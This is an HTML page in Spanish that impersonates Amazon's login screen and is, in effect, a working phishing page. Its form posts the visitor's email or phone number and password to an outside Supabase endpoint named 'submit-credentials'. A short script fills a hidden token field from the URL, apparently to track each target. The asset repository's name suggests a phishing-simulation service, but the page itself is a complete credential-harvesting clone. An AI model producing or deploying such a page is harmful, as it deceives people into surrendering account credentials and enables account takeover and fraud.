<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<title>Amazon Iniciar sesión</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#f3f3f3;font-family:Arial,sans-serif;color:#0f1111;min-height:100vh;padding:14px;display:flex;flex-direction:column;align-items:center}
  .logo{height:38px;margin:14px 0 24px}
  .box{background:#fff;width:100%;max-width:350px;padding:18px 26px 22px;border:1px solid #ddd;border-radius:8px}
  h1{font-weight:400;font-size:28px;margin:0 0 12px}
  label{display:block;font-size:13px;font-weight:700;margin:10px 0 4px}
  input{width:100%;padding:6px 7px;font-size:18px;border:1px solid #a6a6a6;border-radius:3px;outline:none;font-family:inherit;box-shadow:inset 0 1px 0 rgba(0,0,0,.07)}
  input:focus{border-color:#e77600;box-shadow:0 0 3px 2px rgba(228,121,17,.5)}
  button{display:block;width:100%;background:#ffd814;color:#0f1111;border:1px solid #fcd200;border-radius:8px;padding:8px 10px;font-size:13px;font-weight:400;cursor:pointer;font-family:inherit;margin-top:18px}
  button:hover{background:#f7ca00}
  .hint{font-size:12px;color:#0f1111;margin-top:12px}
  a{color:#0066c0;text-decoration:none}
  a:hover{color:#c45500;text-decoration:underline}
</style></head>
<body>
<img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/amazon.png" alt="Amazon">
<div class="box">
  <h1>Iniciar sesión</h1>
  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
    <input type="hidden" name="token" id="token-field">
    <label>Correo electrónico o número de teléfono móvil</label>
    <input type="text" name="email" required autofocus>
    <label>Contraseña</label>
    <input type="password" name="password" required>
    <button type="submit">Iniciar sesión</button>
  </form>
  <p class="hint">Al continuar, aceptas las <a href="#">Condiciones de uso</a> y el <a href="#">Aviso de privacidad</a> de Amazon.</p>
</div>
<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
</body></html>
